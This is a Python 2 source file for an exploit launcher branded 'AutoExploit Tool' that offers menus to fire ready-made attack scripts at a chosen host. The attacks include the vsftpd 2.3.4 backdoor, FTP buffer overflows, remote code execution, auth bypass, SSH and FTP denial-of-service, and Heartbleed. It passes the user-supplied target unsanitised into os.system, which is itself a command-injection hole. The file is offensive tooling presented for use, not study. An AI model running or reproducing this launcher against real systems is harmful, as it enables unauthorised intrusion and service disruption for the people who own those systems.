import os

ban =  '''    _____                          _____       _       _ _   
  / ____|                        / ____|     | |     (_) |  
 | (___  _   _ _ __   ___ _ __  | (___  _ __ | | ___  _| |_ 
  \___ \| | | | '_ \ / _ \ '__|  \___ \| '_ \| |/ _ \| | __|
  ____) | |_| | |_) |  __/ |     ____) | |_) | | (_) | | |_ 
 |_____/ \__,_| .__/ \___|_|    |_____/| .__/|_|\___/|_|\__|
              | |                      | |                  
              |_|                      |_|                  
         AutoExploit Tool | Savage - Telegram: @un00mz
'''


def menu_ftp():
	os.system('clear')
	print ban
	print "\nVSFTPd 2.3.4 Exploit                {1}"
	print "Konica Minolta FTP Utility 1.00     {2}"
	print "PyroBatchFTP_3.17 - Buffer Overflow {3}"
	print "AyuKov NFTP FTP - Buffer-Overflow   {4}"
	print "WinaXe_7.7_FTP RemoteBufferOverflow {5}"
	print "Konica Minolta FTP Utility 1.00 RCE {6}"
	print "FTP Media Server 3.0 - Auth Bypass  {7}"
	print "FreeFTP_1.0.8 Denial of Service     {8}"
	print "BabyFTP Server 1.24 DoS             {9}"
	print "Smallftpd_1.0.3 Denial of Service   {10}"
	print "PcManFtp Server 2.0.7 RemoteBufferO {11}"
	print "Back                                {12}"
	selectftp = input("\nSelect -> ")
	if selectftp == 1:
		targetftp = raw_input("\nHost > ")
		os.system('python bin/exploits/FTP/vsftp_backsploit.py %(targetftp)s 21' % locals())
	if selectftp == 2:
		targetftp = raw_input("\ntarget > ")
		os.system('python bin/exploits/FTP/konicamftp.py %(targetftp)s' % locals())
	if selectftp == 3:
		targetftp = raw_input('target -> ')
		os.system('python bin/exploits/FTP/PyroBatchFTP_3.17.py %(targetftp)s' % locals())
	if selectftp == 4:
		targetftp = raw_input('target -> ')
		os.system('python bin/exploits/FTP/ayukov_nftp.py %(targetftp)s' % locals())
	if selectftp == 5:
		targetftp = raw_input('target -> ')
		os.system('sudo python bin/exploits/FTP/WinaXe_7.7_ftp.py %(targetftp)s' % locals())
	if selectftp == 6:
		os.system('sudo python bin/exploits/FTP/konicamftp_RCE.py')
	if selectftp == 7:
		targetftp = raw_input('target -> ')
		os.system('python bin/exploits/FTP/ftpmedia_server3.0.py %(targetftp)s' % locals())
	if selectftp == 8:
		os.system('python bin/exploits/FTP/freeftp_1.0.8-DoS.py')
	if selectftp == 9:
		os.system('python bin/exploits/FTP/babyftp-server_1.24-DoS.py')
	if selectftp == 10:
		os.system('python bin/exploits/FTP/smallftpd_1.0.3-DoS.py')
	if selectftp == 11:
		os.system('python bin/exploits/FTP/pcmanftp.py')
	if selectftp == 12:
		os.system('clear')
		os.system('python menu.py')

def menu_ssh():
	os.system('clear')
	print ban
	print "OpenSSH_7.2p1         {1}"
	print "FreeSSHd_1.2.3 - DDOS {2}"
	print "OpenSSH 7.2 - DoS     {3} "
	print "Back                  {4}"
	selectssh = input('\nSelect -> ')
	if selectssh == 1:
		targetssh = raw_input("target -> ")
		os.system('python bin/exploits/SSH/OpenSSH_7.2p1.py %(targetssh)s 22' % locals())
	if selectssh == 2:
		targetssh = raw_input("target -> ")
		os.system('python bin/exploits/SSH/freesshd_1.2.3DDOS.py %(targetssh)s ' % locals())
	if selectssh == 3:
		targetssh = raw_input("target -> ")
		os.system('python bin/exploits/SSH/openssh_7.2-dos.py %(targetssh)s ' % locals())
	if selectssh == 4:
		os.system('clear')
		os.system('python menu.py')

def menu_openssl():
	os.system('clear')
	print ban
	print "HeartBleed {1}"
	print "Back       {2}"
	selectssl = input("\nSelect -> ")
	if selectssl == 1:
		targetssl = raw_input('target -> ')
		portssl = input('port -> ')
		os.system('python bin/exploits/OPENSSL/heartbleed.py %(targetssl)s %(portssl)s' % locals())
	if selectssl == 2:
		os.system('clear')
		os.system('python menu.py')
